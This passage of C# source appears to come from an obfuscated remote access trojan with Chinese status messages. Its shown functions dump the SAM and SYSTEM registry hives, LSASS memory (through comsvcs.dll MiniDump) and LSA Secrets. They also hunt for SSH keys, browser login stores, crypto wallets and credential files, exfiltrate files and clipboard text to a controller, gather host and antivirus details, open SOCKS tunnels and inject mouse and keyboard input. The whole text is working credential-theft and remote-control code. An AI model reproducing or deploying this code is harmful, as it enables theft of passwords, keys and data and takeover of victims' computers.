                for (int i = 0; i < structSize; i++) Marshal.WriteByte(infoPtr, i, 0);

                if (ptrSize == 8)
                {
                    
                    Marshal.WriteInt32(infoPtr, 0, structSize);  
                    Marshal.WriteInt32(infoPtr, 4, 1);           
                    Marshal.WriteIntPtr(infoPtr, 8, noncePtr);   
                    Marshal.WriteInt32(infoPtr, 16, nonce.Length);
                    
                    Marshal.WriteIntPtr(infoPtr, 40, tagPtr);    
                    Marshal.WriteInt32(infoPtr, 48, tag.Length);  
                    
                }
                else
                {
                    
                    Marshal.WriteInt32(infoPtr, 0, structSize);
                    Marshal.WriteInt32(infoPtr, 4, 1);
                    Marshal.WriteIntPtr(infoPtr, 8, noncePtr);
                    Marshal.WriteInt32(infoPtr, 12, nonce.Length);
                    
                    Marshal.WriteIntPtr(infoPtr, 24, tagPtr);
                    Marshal.WriteInt32(infoPtr, 28, tag.Length);
                }

                byte[] plaintext = new byte[ct.Length];
                int resultLen;
                int status = BCryptDecrypt(hKey, ct, ct.Length, infoPtr, null, 0, plaintext, plaintext.Length, out resultLen, 0);
                if (status != 0) return null;
                return Encoding.UTF8.GetString(plaintext, 0, resultLen);
            }
            catch { return null; }
            finally
            {
                if (noncePtr != IntPtr.Zero) Marshal.FreeHGlobal(noncePtr);
                if (tagPtr != IntPtr.Zero) Marshal.FreeHGlobal(tagPtr);
                if (infoPtr != IntPtr.Zero) Marshal.FreeHGlobal(infoPtr);
                if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
                if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
            }
        }

        
        string _TuCiMNCIQDsxU()
        {
            string tempDir = Path.Combine(Path.GetTempPath(), "sd" + Guid.NewGuid().ToString("N").Substring(0, 6));
            Directory.CreateDirectory(tempDir);
            string samPath = Path.Combine(tempDir, "s");
            string sysPath = Path.Combine(tempDir, "y");

            try
            {
                if (_HYogZcd._UpUTVTI())
                {
                    try { _fSshpcIDbaxmHgw(_Q._S("P5xlpqiWknJzcdhFGH2xEQk=")); } catch { }
                    _abIdbUQe("reg", "save HKLM\\SAM \"" + samPath + "\" /y");
                    _abIdbUQe("reg", "save HKLM\\SYSTEM \"" + sysPath + "\" /y");
                }
                else
                {
                    
                    string cmd = "reg save HKLM\\SAM \"" + samPath + "\" /y & reg save HKLM\\SYSTEM \"" + sysPath + "\" /y";
                    _HYogZcd._DtVckTCHXhi(cmd, 15000);
                }

                if (!File.Exists(samPath) || !File.Exists(sysPath))
                    return "无法导出注册表 hive（UAC bypass 可能被阻止）";

                byte[] samBytes = File.ReadAllBytes(samPath);
                byte[] sysBytes = File.ReadAllBytes(sysPath);

                return string.Format("SAM({0}bytes):{1}\nSYSTEM({2}bytes):{3}",
                    samBytes.Length, Convert.ToBase64String(samBytes),
                    sysBytes.Length, Convert.ToBase64String(sysBytes));
            }
            finally
            {
                try { File.Delete(samPath); } catch { }
                try { File.Delete(sysPath); } catch { }
                try { Directory.Delete(tempDir); } catch { }
            }
        }

        void _abIdbUQe(string file, string args)
        {
            var psi = new ProcessStartInfo(file, args)
            {
                UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true, CreateNoWindow = true
            };
            var proc = Process.Start(psi);
            proc.StandardOutput.ReadToEnd();
            proc.WaitForExit(15000);
        }

        
        string _rRnfJpAFw()
        {
            var procs = Process.GetProcessesByName("lsass");
            if (procs.Length == 0) return "找不到 lsass 进程";
            int lsassPid = procs[0].Id;

            string dumpPath = Path.Combine(Path.GetTempPath(), "t" + Guid.NewGuid().ToString("N").Substring(0, 6) + ".tmp");
            var errors = new StringBuilder();
            try
            {
                if (_HYogZcd._UpUTVTI())
                {
                    try { _fSshpcIDbaxmHgw(_Q._S("P5xjoqmIgFJRasdaHXSzEw==")); } catch { }

                    
                    try
                    {
                        
                        IntPtr hComsvcs = LoadLibrary(_Q._S("D5ZKtL2elCxHb90="));
                        if (hComsvcs != IntPtr.Zero)
                        {
                            IntPtr pMiniDump = GetProcAddress(hComsvcs, "MiniDumpW");
                            if (pMiniDump != IntPtr.Zero)
                            {
                                
                                string args = string.Format("{0} {1} full", lsassPid, dumpPath);
                                var del = (MiniDumpWDelegate)Marshal.GetDelegateForFunctionPointer(pMiniDump, typeof(MiniDumpWDelegate));
                                del(IntPtr.Zero, IntPtr.Zero, args);
                            }
                        }
                    }
                    catch (Exception ex) { errors.Append("comsvcs:" + ex.Message + "; "); }

                    
                    if (!File.Exists(dumpPath) || new FileInfo(dumpPath).Length < 1024)
                    {
                        try
                        {
                            var psi = new ProcessStartInfo(_Q._S("D5RD6a6Fgg=="),
                                string.Format("/c rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {0} \"{1}\" full", lsassPid, dumpPath))
                            { UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden,
                              RedirectStandardOutput = true, RedirectStandardError = true };
                            var proc = Process.Start(psi);
                            proc.WaitForExit(20000);
                        }
                        catch (Exception ex) { errors.Append("rundll32:" + ex.Message + "; "); }
                    }

                    
                    if (!File.Exists(dumpPath) || new FileInfo(dumpPath).Length < 1024)
                    {
                        try
                        {
                            using (var fs = new FileStream(dumpPath, FileMode.Create, FileAccess.ReadWrite))
                            {
                                bool ok = MiniDumpWriteDump(procs[0].Handle, lsassPid, fs.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                                if (!ok) errors.Append("MiniDump:err=" + Marshal.GetLastWin32Error() + "; ");
                            }
                        }
                        catch (Exception ex) { errors.Append("direct:" + ex.Message + "; "); }
                    }
                }
                else
                {
                    
                    string cmd = string.Format(
                        "cmd.exe /c rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {0} \"{1}\" full",
                        lsassPid, dumpPath);
                    _HYogZcd._DtVckTCHXhi(cmd, 20000);
                }

                if (!File.Exists(dumpPath) || new FileInfo(dumpPath).Length < 1024)
                    return "LSASS dump 失败 (" + errors.ToString() + ")";

                var fi = new FileInfo(dumpPath);
                if (fi.Length > 100 * 1024 * 1024)
                    return "LSASS dump 过大 (" + (fi.Length / 1024 / 1024) + "MB)，请使用 mem_exec 下载";

                byte[] dumpBytes = File.ReadAllBytes(dumpPath);
                return "LSASS(" + dumpBytes.Length + "bytes):" + Convert.ToBase64String(dumpBytes);
            }
            finally
            {
                try { File.Delete(dumpPath); } catch { }
            }
        }

        
        delegate void MiniDumpWDelegate(IntPtr hwnd, IntPtr hinst, [MarshalAs(UnmanagedType.LPWStr)] string args);

        
        string DumpLsaSecrets()
        {
            if (!_HYogZcd._UpUTVTI())
                return "需要管理员权限才能读取 LSA Secrets";

            try { _fSshpcIDbaxmHgw(_Q._S("P5xjoqmIgFJRasdaHXSzEw==")); } catch { }

            
            IntPtr hSecKey;
            int rc = RegOpenKeyExW(new IntPtr(unchecked((int)0x80000002)), 
                "SECURITY\\Policy\\Secrets", 0,
                0x20019, 
                out hSecKey);
            if (rc != 0)
                return "无法打开 SECURITY\\Policy\\Secrets (error=" + rc + ") - 需要 SYSTEM 权限或 SeBackupPrivilege";

            var secretNames = new System.Collections.Generic.List<string>();
            for (int i = 0; ; i++)
            {
                var nameBuf = new StringBuilder(256);
                int nameLen = 256;
                rc = RegEnumKeyExW(hSecKey, i, nameBuf, ref nameLen, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                if (rc != 0) break; 
                secretNames.Add(nameBuf.ToString());
            }
            RegCloseKey(hSecKey);

            if (secretNames.Count == 0)
                return "未找到 LSA Secret 子键（可能权限不足）";

            
            
            int oaSize = 24;
            IntPtr oaPtr = Marshal.AllocHGlobal(oaSize);
            for (int i = 0; i < oaSize; i++) Marshal.WriteByte(oaPtr, i, 0);

            IntPtr hPolicy;
            int nts = LsaOpenPolicy(IntPtr.Zero, oaPtr, 0x00000004, out hPolicy); 
            Marshal.FreeHGlobal(oaPtr);
            if (nts != 0)
                return "LsaOpenPolicy 失败 (NTSTATUS=0x" + nts.ToString("X8") + ", win32=" + LsaNtStatusToWinError(nts) + ")";

            var sb = new StringBuilder();
            sb.Append("LSA Secrets (" + secretNames.Count + " keys):\n");

            foreach (string name in secretNames)
            {
                sb.Append("  [" + name + "] = ");
                try
                {
                    
                    int lsaStrSize = IntPtr.Size == 8 ? 16 : 8;
                    IntPtr lsaStr = Marshal.AllocHGlobal(lsaStrSize);
                    IntPtr namPtr = Marshal.StringToHGlobalUni(name);
                    int byteLen = name.Length * 2;
                    Marshal.WriteInt16(lsaStr, 0, (short)byteLen);           
                    Marshal.WriteInt16(lsaStr, 2, (short)(byteLen + 2));     
                    if (IntPtr.Size == 8)
                        Marshal.WriteInt64(lsaStr, 8, namPtr.ToInt64());     
                    else
                        Marshal.WriteInt32(lsaStr, 4, namPtr.ToInt32());     

                    IntPtr privateData;
                    nts = LsaRetrievePrivateData(hPolicy, lsaStr, out privateData);
                    Marshal.FreeHGlobal(namPtr);
                    Marshal.FreeHGlobal(lsaStr);

                    if (nts != 0)
                    {
                        sb.Append("(error 0x" + nts.ToString("X8") + ")\n");
                        continue;
                    }

                    if (privateData == IntPtr.Zero)
                    {
                        sb.Append("(null)\n");
                        continue;
                    }

                    
                    short dataLen = Marshal.ReadInt16(privateData, 0);
                    IntPtr dataBuf;
                    if (IntPtr.Size == 8)
                        dataBuf = new IntPtr(Marshal.ReadInt64(privateData, 8));
                    else
                        dataBuf = new IntPtr(Marshal.ReadInt32(privateData, 4));

                    if (dataLen > 0 && dataBuf != IntPtr.Zero)
                    {
                        byte[] raw = new byte[dataLen];
                        Marshal.Copy(dataBuf, raw, 0, dataLen);

                        
                        bool printable = true;
                        for (int i = 0; i < raw.Length; i++)
                        {
                            if (raw[i] < 0x20 && raw[i] != 0x00 && raw[i] != 0x0A && raw[i] != 0x0D)
                            { printable = false; break; }
                        }
                        if (printable && dataLen >= 2)
                        {
                            string strVal = Encoding.Unicode.GetString(raw).TrimEnd('\0');
                            if (strVal.Length > 0 && strVal.Length < 1024)
                                sb.Append("\"" + strVal + "\"");
                            else
                                sb.Append("hex(" + dataLen + "):" + BitConverter.ToString(raw).Replace("-", ""));
                        }
                        else
                        {
                            sb.Append("hex(" + dataLen + "):" + BitConverter.ToString(raw).Replace("-", ""));
                        }
                    }
                    else
                    {
                        sb.Append("(empty, len=" + dataLen + ")");
                    }

                    LsaFreeMemory(privateData);
                    sb.Append("\n");
                }
                catch (Exception ex)
                {
                    sb.Append("(exception: " + ex.Message + ")\n");
                }
            }

            LsaClose(hPolicy);
            return sb.ToString().TrimEnd();
        }

        
        
        

        [DllImport("user32.dll")]
        static extern bool OpenClipboard(IntPtr hWndNewOwner);
        [DllImport("user32.dll")]
        static extern bool CloseClipboard();
        [DllImport("user32.dll")]
        static extern IntPtr GetClipboardData(uint uFormat);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport("kernel32.dll")]
        static extern bool GlobalUnlock(IntPtr hMem);

        void HandleFileSteal(string id, string payload)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string scope = _hUALleDbnckSq(payload, "scope"); 
                    if (string.IsNullOrEmpty(scope)) scope = "quick";
                    int maxFiles = 500;
                    var sMaxStr = _hUALleDbnckSq(payload, "max");
                    if (!string.IsNullOrEmpty(sMaxStr)) int.TryParse(sMaxStr, out maxFiles);
                    if (maxFiles <= 0 || maxFiles > 2000) maxFiles = 500;

                    
                    string[] sensitivePatterns = new string[] {
                        
                        "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "*.pem", "*.ppk", "*.key",
                        "authorized_keys", "known_hosts", "*.pub",
                        
                        "passwords*", "credential*", "secret*", "*.kdbx", "*.kdb",
                        "logins.json", "key3.db", "key4.db", _Q._S("IJZArqXdo2NXYg=="), "Web Data",
                        
                        "wallet.dat", "*.wallet", "seed*", "mnemonic*",
                        
                        "*.ovpn", "*.rdp", "*.rdg", "*.remmina",
                        
                        ".env", "*.conf", "*.config", "wp-config.php",
                        "web.config", "appsettings*.json", "docker-compose*",
                        
                        "*.pfx", "*.p12", "*.cer", "*.crt",
                        
                        "*.xlsx", "*.docx", "*.pdf"
                    };

                    
                    var searchDirs = new List<string>();
                    string userHome = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                    searchDirs.Add(Path.Combine(userHome, "Desktop"));
                    searchDirs.Add(Path.Combine(userHome, "Documents"));
                    searchDirs.Add(Path.Combine(userHome, "Downloads"));
                    searchDirs.Add(Path.Combine(userHome, ".ssh"));
                    searchDirs.Add(Path.Combine(userHome, ".aws"));
                    searchDirs.Add(Path.Combine(userHome, ".kube"));
                    searchDirs.Add(Path.Combine(userHome, ".docker"));
                    searchDirs.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla"));
                    searchDirs.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin"));
                    searchDirs.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Ethereum"));

                    if (scope == "deep")
                    {
                        
                        searchDirs.Clear();
                        try
                        {
                            foreach (var drv in DriveInfo.GetDrives())
                            {
                                if (drv.IsReady && (drv.DriveType == DriveType.Fixed || drv.DriveType == DriveType.Removable))
                                    searchDirs.Add(drv.RootDirectory.FullName);
                            }
                        }
                        catch { searchDirs.Add(userHome); }
                        if (searchDirs.Count == 0) searchDirs.Add(userHome);
                    }

                    var found = new List<string>();
                    foreach (string dir in searchDirs)
                    {
                        if (found.Count >= maxFiles) break;
                        if (!Directory.Exists(dir)) continue;
                        try
                        {
                            SearchSensitiveFiles(dir, sensitivePatterns, found, maxFiles,
                                scope == "deep" ? 5 : 3, scope == "deep");
                        }
                        catch { }
                    }

                    
                    var sb = new StringBuilder();
                    sb.Append("{\"files\":[");
                    bool first = true;
                    foreach (string f in found)
                    {
                        try
                        {
                            var fi = new FileInfo(f);
                            if (!first) sb.Append(",");
                            first = false;
                            sb.Append(string.Format("{{\"path\":\"{0}\",\"size\":{1},\"modified\":\"{2}\"}}",
                                _AexenijxeK(f), fi.Length, fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")));
                        }
                        catch { }
                    }
                    sb.Append("],\"total\":" + found.Count + ",\"scope\":\"" + scope + "\"}");
                    _TfnfMjSzCWKv("file_steal_result", id, sb.ToString());
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("file_steal_result", id,
                        "{\"error\":\"" + _AexenijxeK(ex.Message) + "\",\"files\":[]}");
                }
            });
        }

        void SearchSensitiveFiles(string dir, string[] patterns, List<string> results, int maxFiles, int maxDepth, bool includeDocuments)
        {
            if (maxDepth <= 0 || results.Count >= maxFiles) return;
            try
            {
                foreach (string file in Directory.GetFiles(dir))
                {
                    if (results.Count >= maxFiles) return;
                    try
                    {
                        string name = Path.GetFileName(file).ToLowerInvariant();
                        var fi = new FileInfo(file);
                        
                        if (fi.Length > 50 * 1024 * 1024) continue;
                        
                        if (!includeDocuments && fi.Length > 10 * 1024 * 1024) continue;

                        foreach (string pattern in patterns)
                        {
                            string p = pattern.ToLowerInvariant();
                            if (!includeDocuments && (p == "*.xlsx" || p == "*.docx" || p == "*.pdf"))
                                continue;

                            if (p.StartsWith("*"))
                            {
                                if (name.EndsWith(p.Substring(1))) { results.Add(file); break; }
                            }
                            else if (p.EndsWith("*"))
                            {
                                if (name.StartsWith(p.Substring(0, p.Length - 1))) { results.Add(file); break; }
                            }
                            else
                            {
                                if (name == p || name.Contains(p)) { results.Add(file); break; }
                            }
                        }
                    }
                    catch { }
                }

                foreach (string subDir in Directory.GetDirectories(dir))
                {
                    if (results.Count >= maxFiles) return;
                    string dirName = Path.GetFileName(subDir).ToLowerInvariant();
                    
                    if (dirName == "node_modules" || dirName == ".git" || dirName == "__pycache__"
                        || dirName == "cache" || dirName == "temp" || dirName == "tmp"
                        || dirName == "appdata" && maxDepth <= 2) continue;
                    try { SearchSensitiveFiles(subDir, patterns, results, maxFiles, maxDepth - 1, includeDocuments); }
                    catch { }
                }
            }
            catch { }
        }

        
        void HandleFileExfil(string id, string payload)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string filePath = _hUALleDbnckSq(payload, "path");
                    if (string.IsNullOrEmpty(filePath) || !File.Exists(filePath))
                    {
                        _TfnfMjSzCWKv("file_exfil_result", id, "{\"error\":\"文件不存在\"}");
                        return;
                    }

                    var fi = new FileInfo(filePath);
                    if (fi.Length > 50 * 1024 * 1024)
                    {
                        _TfnfMjSzCWKv("file_exfil_result", id, "{\"error\":\"文件过大\"}");
                        return;
                    }

                    byte[] data = File.ReadAllBytes(filePath);
                    string b64 = Convert.ToBase64String(data);
                    _TfnfMjSzCWKv("file_exfil_result", id, string.Format(
                        "{{\"name\":\"{0}\",\"path\":\"{1}\",\"size\":{2},\"data\":\"{3}\"}}",
                        _AexenijxeK(fi.Name), _AexenijxeK(filePath), data.Length, b64));
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("file_exfil_result", id,
                        "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        
        
        

        void HandleClipboardDump(string id)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string text = "";
                    Thread staThread = new Thread(() =>
                    {
                        try
                        {
                            if (OpenClipboard(IntPtr.Zero))
                            {
                                try
                                {
                                    
                                    IntPtr hData = GetClipboardData(13);
                                    if (hData != IntPtr.Zero)
                                    {
                                        IntPtr pStr = GlobalLock(hData);
                                        if (pStr != IntPtr.Zero)
                                        {
                                            text = Marshal.PtrToStringUni(pStr);
                                            GlobalUnlock(hData);
                                        }
                                    }
                                }
                                finally { CloseClipboard(); }
                            }
                        }
                        catch { }
                    });
                    staThread.SetApartmentState(ApartmentState.STA);
                    staThread.Start();
                    staThread.Join(3000);

                    _TfnfMjSzCWKv("clipboard_result", id, string.Format(
                        "{{\"text\":\"{0}\",\"length\":{1}}}",
                        _AexenijxeK(text ?? ""), (text ?? "").Length));
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("clipboard_result", id,
                        "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        
        void HandleInfoDump(string id)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    var sb = new StringBuilder();
                    sb.Append("{");

                    
                    sb.Append("\"hostname\":\"" + _AexenijxeK(Environment.MachineName) + "\",");
                    sb.Append("\"username\":\"" + _AexenijxeK(Environment.UserName) + "\",");
                    sb.Append("\"domain\":\"" + _AexenijxeK(Environment.UserDomainName) + "\",");
                    sb.Append("\"os\":\"" + _AexenijxeK(Environment.OSVersion.ToString()) + "\",");
                    sb.Append("\"arch\":\"" + (Environment.Is64BitOperatingSystem ? "x64" : "x86") + "\",");
                    sb.Append("\"isAdmin\":" + (_HYogZcd._UpUTVTI() ? "true" : "false") + ",");

                    
                    sb.Append("\"network\":[");
                    bool netFirst = true;
                    try
                    {
                        foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
                        {
                            if (ni.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue;
                            if (ni.NetworkInterfaceType == System.Net.NetworkInformation.NetworkInterfaceType.Loopback) continue;
                            foreach (var addr in ni.GetIPProperties().UnicastAddresses)
                            {
                                if (addr.Address.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
                                if (!netFirst) sb.Append(",");
                                netFirst = false;
                                sb.Append(string.Format("{{\"name\":\"{0}\",\"ip\":\"{1}\",\"mac\":\"{2}\"}}",
                                    _AexenijxeK(ni.Name), addr.Address, ni.GetPhysicalAddress()));
                            }
                        }
                    }
                    catch { }
                    sb.Append("],");

                    
                    sb.Append("\"av\":[");
                    bool avFirst = true;
                    try
                    {
                        using (var searcher = new ManagementObjectSearcher(@"root\SecurityCenter2",
                            "SELECT DisplayName,ProductState FROM AntiVirusProduct"))
                        {
                            foreach (var obj in searcher.Get())
                            {
                                if (!avFirst) sb.Append(",");
                                avFirst = false;
                                sb.Append("\"" + _AexenijxeK((obj["DisplayName"] ?? "").ToString()) + "\"");
                            }
                        }
                    }
                    catch { }
                    sb.Append("],");

                    
                    string domainInfo = "";
                    try
                    {
                        var psi = new ProcessStartInfo("nltest", "/dsgetdc:" + Environment.UserDomainName)
                        {
                            UseShellExecute = false, RedirectStandardOutput = true,
                            CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden
                        };
                        var proc = Process.Start(psi);
                        domainInfo = proc.StandardOutput.ReadToEnd();
                        proc.WaitForExit(5000);
                    }
                    catch { }
                    sb.Append("\"domainInfo\":\"" + _AexenijxeK(domainInfo) + "\",");

                    
                    sb.Append("\"recentDocs\":[");
                    bool rdFirst = true;
                    try
                    {
                        string recent = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                            @"AppData\Roaming\Microsoft\Windows\Recent");
                        if (Directory.Exists(recent))
                        {
                            var files = Directory.GetFiles(recent, "*.lnk");
                            int cnt = 0;
                            foreach (string f in files)
                            {
                                if (cnt++ >= 30) break;
                                if (!rdFirst) sb.Append(",");
                                rdFirst = false;
                                var fi = new FileInfo(f);
                                sb.Append("\"" + _AexenijxeK(Path.GetFileNameWithoutExtension(f)) + "\"");
                            }
                        }
                    }
                    catch { }
                    sb.Append("],");

                    
                    sb.Append("\"env\":{");
                    bool envFirst = true;
                    string[] interestingVars = { "PATH", "TEMP", "COMPUTERNAME", "USERDOMAIN",
                        "LOGONSERVER", "SESSIONNAME", "APPDATA", "PROGRAMFILES" };
                    foreach (string v in interestingVars)
                    {
                        string val = Environment.GetEnvironmentVariable(v);
                        if (!string.IsNullOrEmpty(val))
                        {
                            if (!envFirst) sb.Append(",");
                            envFirst = false;
                            sb.Append("\"" + v + "\":\"" + _AexenijxeK(val) + "\"");
                        }
                    }
                    sb.Append("}");

                    sb.Append("}");
                    _TfnfMjSzCWKv("info_dump_result", id, sb.ToString());
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("info_dump_result", id,
                        "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        
        
        
        

        
        readonly ConcurrentDictionary<string, System.Net.Sockets.TcpClient> _tunnels
            = new ConcurrentDictionary<string, System.Net.Sockets.TcpClient>();

        
        void HandleSocksConnect(string id, string payload)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                string ch = _hUALleDbnckSq(payload, "channel");
                string host = _hUALleDbnckSq(payload, "host");
                string portStr = _hUALleDbnckSq(payload, "port");
                int port = 0;
                int.TryParse(portStr, out port);

                if (string.IsNullOrEmpty(ch) || string.IsNullOrEmpty(host) || port <= 0)
                {
                    _TfnfMjSzCWKv("socks_connect_result", id,
                        "{\"channel\":\"" + _AexenijxeK(ch) + "\",\"ok\":false,\"error\":\"参数无效\"}");
                    return;
                }

                try
                {
                    var tcp = new System.Net.Sockets.TcpClient();
                    tcp.ReceiveTimeout = 30000;
                    tcp.SendTimeout = 15000;
                    tcp.NoDelay = true;

                    
                    var ar = tcp.BeginConnect(host, port, null, null);
                    bool connected = ar.AsyncWaitHandle.WaitOne(10000);
                    if (!connected || !tcp.Connected)
                    {
                        try { tcp.Close(); } catch { }
                        _TfnfMjSzCWKv("socks_connect_result", id,
                            "{\"channel\":\"" + _AexenijxeK(ch) + "\",\"ok\":false,\"error\":\"连接超时\"}");
                        return;
                    }
                    tcp.EndConnect(ar);

                    _tunnels[ch] = tcp;
                    _TfnfMjSzCWKv("socks_connect_result", id,
                        "{\"channel\":\"" + _AexenijxeK(ch) + "\",\"ok\":true}");

                    
                    ThreadPool.QueueUserWorkItem(__ => TunnelReadLoop(ch));
                }
                catch (Exception ex)
                {
                    _TfnfMjSzCWKv("socks_connect_result", id,
                        "{\"channel\":\"" + _AexenijxeK(ch) + "\",\"ok\":false,\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
                }
            });
        }

        
        void TunnelReadLoop(string ch)
        {
            System.Net.Sockets.TcpClient tcp;
            if (!_tunnels.TryGetValue(ch, out tcp)) return;
            try
            {
                var ns = tcp.GetStream();
                byte[] buf = new byte[32768]; 
                while (tcp.Connected && !_cts.IsCancellationRequested)
                {
                    int n = ns.Read(buf, 0, buf.Length);
                    if (n <= 0) break;
                    
                    byte[] chBytes = Encoding.ASCII.GetBytes(ch);
                    byte[] frame = new byte[2 + chBytes.Length + n];
                    frame[0] = 0x01; 
                    frame[1] = (byte)chBytes.Length;
                    Array.Copy(chBytes, 0, frame, 2, chBytes.Length);
                    Array.Copy(buf, 0, frame, 2 + chBytes.Length, n);
                    _SMsdStBZEcRi(frame).Wait();
                }
            }
            catch { }
            finally
            {
                
                _TfnfMjSzCWKv("socks_close", "", "{\"channel\":\"" + _AexenijxeK(ch) + "\"}");
                System.Net.Sockets.TcpClient removed;
                _tunnels.TryRemove(ch, out removed);
                try { tcp.Close(); } catch { }
            }
        }

        
        void HandleSocksData(string id, string payload)
        {
            string ch = _hUALleDbnckSq(payload, "channel");
            string b64 = _hUALleDbnckSq(payload, "data");
            System.Net.Sockets.TcpClient tcp;
            if (!string.IsNullOrEmpty(ch) && !string.IsNullOrEmpty(b64) && _tunnels.TryGetValue(ch, out tcp))
            {
                try
                {
                    byte[] data = Convert.FromBase64String(b64);
                    tcp.GetStream().Write(data, 0, data.Length);
                }
                catch { HandleSocksClose("", "{\"channel\":\"" + _AexenijxeK(ch) + "\"}"); }
            }
        }

        
        internal void HandleTunnelBinaryFrame(byte[] frame)
        {
            
            if (frame == null || frame.Length < 3 || frame[0] != 0x01) return;
            int chLen = frame[1];
            if (frame.Length < 2 + chLen) return;
            string ch = Encoding.ASCII.GetString(frame, 2, chLen);
            System.Net.Sockets.TcpClient tcp;
            if (_tunnels.TryGetValue(ch, out tcp))
            {
                try
                {
                    tcp.GetStream().Write(frame, 2 + chLen, frame.Length - 2 - chLen);
                }
                catch { HandleSocksClose("", "{\"channel\":\"" + _AexenijxeK(ch) + "\"}"); }
            }
        }

        
        void HandleSocksClose(string id, string payload)
        {
            string ch = _hUALleDbnckSq(payload, "channel");
            System.Net.Sockets.TcpClient tcp;
            if (!string.IsNullOrEmpty(ch) && _tunnels.TryRemove(ch, out tcp))
            {
                try { tcp.GetStream().Close(); } catch { }
                try { tcp.Close(); } catch { }
            }
        }

        
        
        
        

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint SendInput(uint nInputs, IntPtr pInputs, int cbSize);
        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        
        const int INPUT_MOUSE = 0;
        const int INPUT_KEYBOARD = 1;
        const int MOUSEEVENTF_MOVE = 0x0001;
        const int MOUSEEVENTF_LEFTDOWN = 0x0002;
        const int MOUSEEVENTF_LEFTUP = 0x0004;
        const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
        const int MOUSEEVENTF_RIGHTUP = 0x0010;
        const int MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        const int MOUSEEVENTF_MIDDLEUP = 0x0040;
        const int MOUSEEVENTF_WHEEL = 0x0800;
        const int MOUSEEVENTF_ABSOLUTE = 0x8000;
        const int KEYEVENTF_KEYUP = 0x0002;
        const int KEYEVENTF_UNICODE = 0x0004;
        const int SM_CXSCREEN = 0;
        const int SM_CYSCREEN = 1;

        void HandleScreenInput(string id, string payload)
        {
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    string inputType = _hUALleDbnckSq(payload, "inputType"); 
                    if (inputType == "mouse")
                    {
                        string xStr = _hUALleDbnckSq(payload, "x");
                        string yStr = _hUALleDbnckSq(payload, "y");
                        string button = _hUALleDbnckSq(payload, "button"); 
                        string action = _hUALleDbnckSq(payload, "action"); 
                        string deltaStr = _hUALleDbnckSq(payload, "delta"); 

                        int x = 0, y = 0, delta = 0;
                        int.TryParse(xStr, out x);
                        int.TryParse(yStr, out y);
                        int.TryParse(deltaStr, out delta);

                        int screenW = GetSystemMetrics(SM_CXSCREEN);
                        int screenH = GetSystemMetrics(SM_CYSCREEN);
                        if (screenW <= 0) screenW = 1920;
                        if (screenH <= 0) screenH = 1080;

                        
                        int absX = (int)((long)x * 65535 / screenW);
                        int absY = (int)((long)y * 65535 / screenH);

                        
                        int inputSize = IntPtr.Size == 8 ? 40 : 28;

                        if (action == "move" || action == "down" || action == "up" || action == "click" || action == "dblclick")
                        {
                            
                            SendMouseInput(inputSize, absX, absY, MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, 0);

                            if (action == "down" || action == "click" || action == "dblclick")
                            {
                                int downFlag = button == "right" ? MOUSEEVENTF_RIGHTDOWN :
                                               button == "middle" ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_LEFTDOWN;
                                SendMouseInput(inputSize, absX, absY, downFlag | MOUSEEVENTF_ABSOLUTE, 0);
                            }
                            if (action == "up" || action == "click" || action == "dblclick")
                            {
                                int upFlag = button == "right" ? MOUSEEVENTF_RIGHTUP :
                                             button == "middle" ? MOUSEEVENTF_MIDDLEUP : MOUSEEVENTF_LEFTUP;
                                SendMouseInput(inputSize, absX, absY, upFlag | MOUSEEVENTF_ABSOLUTE, 0);
                            }
                            if (action == "dblclick")
                            {
                                Thread.Sleep(50);
                                int downFlag = button == "right" ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_LEFTDOWN;
                                int upFlag = button == "right" ? MOUSEEVENTF_RIGHTUP : MOUSEEVENTF_LEFTUP;
                                SendMouseInput(inputSize, absX, absY, downFlag | MOUSEEVENTF_ABSOLUTE, 0);
                                SendMouseInput(inputSize, absX, absY, upFlag | MOUSEEVENTF_ABSOLUTE, 0);
